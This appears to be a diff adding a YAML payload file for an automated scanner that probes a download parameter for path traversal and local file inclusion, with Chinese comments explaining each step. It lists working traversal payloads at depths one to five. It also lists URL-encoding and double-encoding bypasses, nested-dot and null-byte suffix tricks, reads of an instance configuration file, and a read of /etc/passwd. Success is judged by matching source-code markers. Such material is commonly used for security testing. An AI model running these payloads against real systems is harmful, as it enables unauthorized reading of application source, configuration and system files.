@@ -1,0 +1,84 @@
+﻿# 可执行阶梯（信号驱动搜索）—— lfi / 路径穿越读取
+#
+# 设计来源：vendor/hack-skills/skills/file-inclusion 一类的"首轮集合"（编码栈/深度/截断），
+# 但这里是**可执行数据**：每步都真发请求，步进只由硬信号决定（状态码 / 响应长度差分 / marker 命中）。
+# 与 sqli.yaml 的区别：不依赖列宽或 DBMS 自省，只用 pair（真假对照）+ single 两种通用步型，
+# 因为 lfi 的判定信号是"被读出的源码特征出现在响应里"。
+#
+# 命中口径：markers 来自目标 profile 的 plugin.yaml（本类为被穿越读出的源码特征，
+# 例如 EduBackLogger / avatar_url_field / logFile）。模型判断不参与步进。
+class: lfi
+display: 路径穿越读取（下载参数无归一化）
+
+baseline:
+  param_value: "notice.txt"        # 中性基线：files/ 下真实存在的文件（曾误写 welcome.txt ⇒ 基线就 404）
+
+steps:
+  # --- 深度阶梯：从 1 层到 5 层，用 pair 做真假对照（真值应出现源码特征，假值不应）---
+  - id: depth1
+    kind: pair
+    true_value: "../src/app.php"
+    false_value: "app.php"
+    note: 1 层穿越；假值是不带穿越的同名文件 ⇒ 只有真值命中才算穿越成立（app.php 真实位置在 src/ 下）
+
+  - id: depth2
+    kind: pair
+    true_value: "../../app.php"
+    false_value: "app.php"
+
+  - id: depth3
+    kind: pair
+    true_value: "../../../app.php"
+    false_value: "app.php"
+
+  - id: depth4
+    kind: pair
+    true_value: "../../../../app.php"
+    false_value: "app.php"
+
+  - id: depth5
+    kind: pair
+    true_value: "../../../../../app.php"
+    false_value: "app.php"
+
+  # --- 编码栈：同一目标换编码形态（过滤器只挡字面量时这些会穿）---
+  - id: enc_slash_only
+    kind: single
+    value: "..%2fsrc%2fapp.php"
+
+  - id: enc_double
+    kind: single
+    value: "..%252fsrc%252fapp.php"
+
+  - id: enc_dot_dot
+    kind: single
+    value: "%2e%2e/src/app.php"
+
+  - id: enc_nested
+    kind: single
+    value: "....//src/app.php"
+
+  - id: enc_url_full
+    kind: single
+    value: "%2e%2e%2fsrc%2fapp.php"
+
+  # --- 截断/后缀绕过：有些实现要求扩展名白名单 ---
+  - id: null_suffix
+    kind: single
+    value: "../src/app.php%00.txt"
+
+  - id: double_ext
+    kind: single
+    value: "../src/app.php.txt"
+
+  # --- 定向取数：读同一实例的另一个已知文件（命中即确认可读任意文件）---
+  - id: read_instances
+    kind: pair
+    true_value: "../config/instances.php"
+    false_value: "config/instances.php"
+    note: instances.php 含实例配置，是"可读任意文件"的第二证据
+
+  - id: read_absolute
+    kind: single
+    value: "/etc/passwd"
+    note: 绝对路径读系统文件；本类 marker 只认源码特征，故这一发命中与否另有信息量
